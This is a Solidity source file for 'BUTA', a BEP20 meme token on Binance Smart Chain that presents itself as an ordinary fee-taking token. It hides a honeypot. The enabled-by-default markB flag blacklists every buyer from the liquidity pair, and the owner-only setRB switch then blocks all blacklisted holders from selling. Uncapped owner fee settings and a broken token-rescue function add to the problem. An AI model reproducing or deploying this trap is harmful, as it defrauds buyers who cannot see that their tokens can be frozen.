/**
 *Submitted for verification at BscScan.com on 2022-07-17
*/

/**
 
𝘉𝘜𝘛𝘈 𝘪𝘴 𝘢 𝘑𝘢𝘱𝘢𝘯𝘦𝘴𝘦 𝘯𝘢𝘮𝘦 𝘧𝘰𝘳 𝘱𝘪𝘨𝘴 ! 𝘔𝘦𝘦𝘵 𝘉𝘜𝘛𝘈 豚, 𝘵𝘩𝘦 𝘯𝘦𝘸𝘦𝘴𝘵 𝘢𝘯𝘥 𝘮𝘰𝘴𝘵 𝘣𝘢𝘴𝘦𝘥 𝘱𝘪𝘨  𝘭𝘢𝘶𝘯𝘤𝘩𝘦𝘥 𝘰𝘯 𝘵𝘩𝘦 𝘉𝘪𝘯𝘢𝘯𝘤𝘦 𝘚𝘮𝘢𝘳𝘵 𝘊𝘩𝘢𝘪𝘯.

BUTAは豚の日本語名です！ BinanceSmartChainで発売された最新かつ最もベースの高いブタであるBUTAに会いましょう。

*/
 
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;
 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
 
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
 
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
 
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
 
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
 
        return c;
    }
}
 
/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

 
/**
 * Allows for contract ownership
 */
abstract contract Ownable {
    address internal owner;
 
    constructor(address _owner) {
        owner = _owner;
    }
 
    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
 
    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
 
    /**
     * Abandon ownership. Caller must be owner.
     */
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }
 
    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }
 
    event OwnershipTransferred(address owner);
}
 
interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
 
interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
 
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
 
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
 
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract BUTA is IBEP20, Ownable {
    using SafeMath for uint256;
 
    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
 
    string constant _name = "BUTA";
    string constant _symbol = "$BUTA";
    uint8 constant _decimals = 9;
 
    uint256 _totalSupply = 1000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = (_totalSupply * 2) / 100;  // max tx
    uint256 public _maxWalletAmount = (_totalSupply * 2) / 100;  // max wallet
 
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
 
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) public isBlacklisted;
 
    uint256 liquidityFee = 1;
    uint256 marketingFee = 5;
    uint256 teamFee = 2;
    uint256 totalFee = liquidityFee + marketingFee + teamFee;
    uint256 feeDenominator = 100;
 
    address public marketingFeeReceiver = 0xEE14300eDB2657D23267CA4D769538c62F27529a;
    address public teamFeeReceiver = 0x28261e51F6A75ad40100Ab50cc67740A70E02123;
 
    IDEXRouter public router;
    address public pair;
 
    bool public markB = true;
    bool public rektB = false;
    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply / 1000 * 1; // 0.1%
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
 
    constructor () Ownable(msg.sender) {
        router = IDEXRouter(routerAdress);
        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
 
        address _owner = owner;
        isFeeExempt[_owner] = true;
        isTxLimitExempt[_owner] = true;
 
        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }
 
    receive() external payable { }
 
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
 
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
 
    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }
 
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }
 
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
 
        return _transferFrom(sender, recipient, amount);
    }
 
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
 
        checkTxLimit(sender, amount);
 
        if (recipient != pair && recipient != DEAD) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletAmount, "Transfer amount exceeds the bag size.");
        }
 
        if(shouldSwapBack()){ swapBack(); } 
 
        if(markB && sender == pair){
            isBlacklisted[recipient] = true;
        }
 
        if (rektB) {
            require(!isBlacklisted[sender],"Blacklisted"); 
        }
 
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
 
        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
 
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
 
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
 
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }
 
    function setMB(bool value) external onlyOwner {
        markB = value;
    }
 
    function setRB(bool value) external onlyOwner {
        rektB = value;
    }
 
    function setTxLimit(uint256 amountPercent) external onlyOwner {
        _maxTxAmount = (_totalSupply * amountPercent ) / 100;
    }
 
    function setWalletLimit(uint256 amountPercent) external onlyOwner {
        _maxWalletAmount = (_totalSupply * amountPercent ) / 100;
    }
 
    function transferContractBalance() public {
        uint256 contractETHBalance = address(this).balance;
        payable(marketingFeeReceiver).transfer(contractETHBalance);
    }
 
    function transferContractToken(address _token) public {
        require(_token != address(this), "Can't let you take all native token");
        uint256 _contractBalance = IBEP20(_token).balanceOf(address(this));
        payable(marketingFeeReceiver).transfer(_contractBalance);
    }
 
    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }
 
    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }
 
    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }
 
    function getTotalFee() public view returns (uint256) {
        return totalFee;
    }
 
    function setFees(uint256 _liquidityFee, uint256 _marketingFee, uint256 _teamFee) external onlyOwner {
        liquidityFee = _liquidityFee;
        marketingFee = _marketingFee;
        teamFee = _teamFee;
        totalFee = _liquidityFee.add(_marketingFee).add(_teamFee);
    }
 
    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTotalFee()).div(feeDenominator);
 
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
 
        return amount.sub(feeAmount);
    }
 
    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }
 
    function swapBack() internal swapping {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 amountToLiquify = contractTokenBalance.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);
 
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
 
        uint256 balanceBefore = address(this).balance;
 
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountBNB = address(this).balance.sub(balanceBefore);
        uint256 totalBNBFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        uint256 amountBNBTeam = amountBNB.mul(teamFee).div(totalBNBFee);
 
 
        (bool MarketingSuccess, /* bytes memory data */) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
        require(MarketingSuccess, "receiver rejected ETH transfer");
        (bool TeamSuccess, /* bytes memory data */) = payable(teamFeeReceiver).call{value: amountBNBTeam, gas: 30000}("");
        require(TeamSuccess, "receiver rejected ETH transfer");
 
        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                marketingFeeReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }
 
    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(this);
 
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            to,
            block.timestamp
        );
    }
 
    function setSwapBackSettings(bool _enabled, uint256 _amount) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }
 
    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }
 
    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }
 
    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
}